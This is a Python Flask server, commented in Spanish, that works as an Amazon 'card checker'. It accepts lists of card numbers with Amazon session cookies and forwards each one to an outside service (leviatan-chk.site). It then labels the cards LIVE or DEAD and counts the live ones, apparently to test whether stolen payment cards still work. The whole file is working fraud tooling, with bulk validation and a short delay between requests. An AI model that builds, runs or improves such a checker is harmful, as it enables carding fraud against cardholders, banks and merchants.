from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import time
import os

app = Flask(__name__)

# Configuración para producción - PERMITE tu dominio de Hostinger
CORS(app, origins=["*"])

class AmazonChecker:
    def __init__(self):
        self.api_url = "https://leviatan-chk.site/amazon/leviatan"
        self.headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    
    def check_single_card(self, card: str, cookies: str) -> dict:
        data = {
            "card": card,
            "cookies": cookies
        }
        
        try:
            response = requests.post(
                self.api_url, 
                json=data, 
                headers=self.headers,
                timeout=60
            )
            result = response.json()
            
            # Capturar el response original de Leviatan
            original_status = result.get("status", "⚠️ Error")
            original_message = result.get("message", "Sin mensaje")
            
            # Clasificar y modificar el response
            status_lower = str(original_status).lower()
            message_lower = str(original_message).lower()
            
            # Determinar si es LIVE, DEAD o ERROR
            if any(keyword in status_lower or keyword in message_lower 
                   for keyword in ["approved", "aprobado", "éxito", "success", "live", "active",
                                   "valid", "válido", "checkout", "purchase", "charge", "cobro"]):
                final_status = "LIVE"
                final_message = "✅ Tarjeta activa"
                
            elif any(keyword in status_lower or keyword in message_lower 
                     for keyword in ["declined", "rechazado", "denied", "dead", "invalid", "inválido",
                                     "failed", "fallido", "incorrect", "incorrecto", "do not honor",
                                     "insufficient", "insuficiente", "stolen", "lost", "restricted"]):
                final_status = "DEAD" 
                final_message = "❌ Tarjeta rechazada"
                
            elif any(keyword in status_lower or keyword in message_lower 
                     for keyword in ["error", "fallo", "timeout", "captcha", "security", "seguridad",
                                     "blocked", "bloqueado", "limit", "límite", "try again", "reintentar"]):
                final_status = "ERROR"
                final_message = "⚠️ Error en verificación"
                
            else:
                # Si no coincide con ningún patrón conocido
                final_status = "UNKNOWN"
                final_message = "❓ Estado no determinado"
            
            return {
                "success": True,
                "status": final_status,
                "message": final_message,
                "original_status": original_status,  # Para debugging
                "original_message": original_message,  # Para debugging
                "raw_response": result
            }
            
        except Exception as e:
            return {
                "success": False,
                "status": "ERROR",
                "message": f"❌ Error de conexión: {str(e)}",
                "original_status": "⚠️ Error",
                "original_message": f"Error de conexión: {str(e)}",
                "raw_response": None
            }

checker = AmazonChecker()

@app.route('/')
def home():
    return jsonify({
        "message": "✅ Amazon Checker API - Leviatan",
        "status": "active",
        "endpoints": {
            "health": "/api/health",
            "check_card": "/api/check-card",
            "check_multiple": "/api/check-multiple-cards"
        }
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "✅ Servidor funcionando en Northflank",
        "timestamp": time.time()
    })

@app.route('/api/check-card', methods=['POST'])
def check_card():
    try:
        data = request.get_json()
        
        if not data or 'card' not in data or 'cookies' not in data:
            return jsonify({
                "success": False,
                "error": "Datos incompletos. Se requieren 'card' y 'cookies'"
            }), 400
        
        card = data['card']
        cookies = data['cookies']
        
        print(f"🔍 Verificando tarjeta: {card[:16]}...")
        
        result = checker.check_single_card(card, cookies)
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Error interno: {str(e)}"
        }), 500

@app.route('/api/check-multiple-cards', methods=['POST'])
def check_multiple_cards():
    try:
        data = request.get_json()
        
        if not data or 'cards' not in data or 'cookies' not in data:
            return jsonify({
                "success": False,
                "error": "Datos incompletos. Se requieren 'cards' y 'cookies'"
            }), 400
        
        cards = data['cards']
        cookies = data['cookies']
        
        if not isinstance(cards, list):
            return jsonify({
                "success": False,
                "error": "El campo 'cards' debe ser una lista"
            }), 400
        
        print(f"🔍 Verificando {len(cards)} tarjetas...")
        
        results = []
        for i, card in enumerate(cards, 1):
            print(f"Procesando tarjeta {i}/{len(cards)}...")
            
            result = checker.check_single_card(card, cookies)
            results.append({
                "card": card,
                "result": result
            })
            
            time.sleep(1)
        
        # Actualizar contadores con los nuevos estados
        live_count = sum(1 for r in results if r["result"]["status"] == "LIVE")
        dead_count = sum(1 for r in results if r["result"]["status"] == "DEAD")
        error_count = sum(1 for r in results if r["result"]["status"] == "ERROR")
        unknown_count = sum(1 for r in results if r["result"]["status"] == "UNKNOWN")
        
        return jsonify({
            "success": True,
            "summary": {
                "total": len(results),
                "live": live_count,
                "dead": dead_count,
                "error": error_count,
                "unknown": unknown_count
            },
            "details": results
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Error interno: {str(e)}"
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)